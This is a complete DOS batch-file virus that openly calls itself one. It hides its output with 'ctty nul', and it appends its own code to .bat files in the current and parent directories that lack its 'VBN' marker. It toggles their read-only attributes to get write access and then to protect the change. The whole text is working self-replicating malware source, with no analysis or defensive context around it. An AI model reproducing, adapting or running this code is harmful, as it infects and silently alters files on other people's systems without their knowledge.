@ctty nul
:It is Virus!
for %%a in (*.bat ..\*.bat) do set VBN=%%a
attrib %VBN% -r
for %%w in (%VBN%) do find "VBN" %%w
if errorlevel 1 type %0 >> %VBN%
attrib %VBN% +r
